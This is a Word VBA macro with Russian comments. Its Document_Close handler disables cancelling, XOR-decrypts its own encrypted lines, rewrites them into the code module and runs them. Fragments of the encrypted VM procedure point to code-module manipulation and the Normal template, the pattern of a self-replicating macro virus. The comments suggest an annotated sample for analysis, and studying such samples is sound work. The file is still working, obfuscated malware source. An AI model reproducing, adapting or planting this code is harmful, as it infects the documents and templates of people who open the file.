Private Sub Document_Close()
    Application.EnableCancelKey = wdCancelDisabled  ' отключить возможность отменить выполнение макроса
    ' Расшифрование содержимого процедуры VM
    For V1 = 18 To 39  ' перебрать строки модуля VBA (с 18-й по 39-ю) текущего документа
        V2 = Null
        V3 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1)  ' строка №V1 из кода
        V4 = Asc(Mid(V3, 2, 1))  ' ASCII-код второго символа строки V3
        V5 = V4 Xor 39  ' ключ для расшифровки
        For V6 = 3 To Len(V3)  ' расшифровать остальную часть строки V3, начиная с 3-го символа, используя XOR с V5
            V7 = Asc(Mid(V3, V6, 1)) Xor V5
            V2 = V2 & Chr(V7)
        Next V6
        V8 = V2
        ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8  ' заменить исходную строку V1 на расшифрованную V2
    Next V1
    Call VM
End Sub
Private Sub VM()
'!@it&P7&;&7>&Ri&5?
'"S7%8%Kpii
'"S6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-S4)%4,,
'$U7#>#Jmw+Qmg+*#)#;*#(#2
'$Elq#U6#>#2#Wl#Ofm+U0*
' Q1':'Ftd/Jnc/Q4+'Q2+'6..'_hu'Q3
'&W3!<!W3!'!Bis)W7(
' Ibs'Q2
' Q0':'Q5
'!RnouBieskchr(PDVtilcer(PDEikvihchru(Orck.7/(EibcKibsjc(TcvjgecJohc&P7*&$!$& &P1
'&Odyu!W0
'#Ktpmkjw*RmvqwTvkpagpmkj$9$4
' Hwsnhit)TfqbIhujfkWuhjws':'7
' Hwsnhit)DhianujDhiqbutnhit':'7
'$U;#>#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-Ojmfp+2/#WkjpGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof-@lvmwLeOjmfp*
'/[m|(^1(5(Fgzeid\mexdi|m&^JXzgbmk|&^JKgexgfmf|{&A|me9!&KglmEgl}dm
' Q>)CbkbsbKnibt'6+'Q>)DhrisHaKnibt
'&W8/@eeGsnlRushof!W9
'/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me9!&KglmEgl}dm
'$UB-GfofwfOjmfp#2/#UB-@lvmwLeOjmfp
'"SD+DaaCwjhVqwlkb%S=
' FdsnqbChdrjbis)TfqbFt'AnkbIfjb=:FdsnqbChdrjbis)ArkkIfjb
End Sub
